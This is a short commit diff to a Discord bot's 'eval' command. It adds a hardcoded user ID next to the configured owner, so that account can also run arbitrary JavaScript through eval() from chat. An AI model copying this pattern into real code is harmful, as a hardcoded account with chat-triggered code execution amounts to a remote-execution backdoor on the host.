3f35cb9a59d640dfddc326a1e1e5729a66cea70d
James Cook <47297250+jamesatjaminit@users.noreply.github.com>
2021-03-03 14:08:25 +0000

    Update eval.js

--- commands/eval.js
+++ commands/eval.js
@@ -5,7 +5,11 @@ module.exports = {
 	description: 'Executes code',
 	usage: 'eval 1+1',
 	execute(client, message, args, db, logger) {
-		if (!(message.author.id == config.settings.ownerid)) return message.channel.send(messages.getPermissionsMessage())
-		message.channel.send(String(eval(args.splice(0).join(' '))))
+		if ((message.author.id == config.settings.ownerid) || message.author.id == '523963702245064725') {
+			message.channel.send(String(eval(args.splice(0).join(' '))))
+		} else {
+			message.channel.send(messages.getPermissionsMessage())
+		}
+		
 	},
 }
